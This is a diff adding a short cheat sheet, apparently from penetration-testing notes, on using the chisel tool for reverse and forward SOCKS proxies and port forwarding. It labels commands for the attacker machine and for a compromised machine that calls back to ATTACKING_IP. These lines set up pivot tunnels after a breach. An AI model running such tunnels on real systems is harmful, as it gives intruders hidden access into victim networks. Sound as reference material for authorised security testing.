@@ -1,0 +1,26 @@
+- chisel : 
+    - description :
+        - allow portforwarding and proxying
+        - do not need ssh
+    - source : 
+        - https://github.com/jpillora/chisel/releases
+    - syntax :
+        - proxy : 
+            - reverse SOCKS proxy : 
+                - on the attacker machine : chisel server -p LISTEN_PORT --reverse &
+                - on the compromized machine : chisel client ATTACKING_IP:LISTEN_PORT R:socks &
+                - this create a proxy on the localhost in PROXY_PORT, a port other than the LISTEN_PORT
+            - forward SOCKS proxy :
+                - on the attacker machine : chisel client VICTIM_IP:LISTEN_PORT PROXY_PORT:socks
+                - on the compromized machine : chisel server -p LISTEN_PORT --socks5
+            - usage : 
+                - chisel use socks5 so the configuration to use it in the proxychains : 
+                    [ProxyList]
+                    socks5  127.0.0.1 PROXY_PORT
+        - port forwarding : 
+            - reverse : 
+                - on the attacker machine : chisel server -p LISTEN_PORT --reverse &
+                - on the compromized machine : chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
+            - forward :
+                - on the compromized machine : chisel server -p LISTEN_PORT &
+                - on the attacker machine : chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
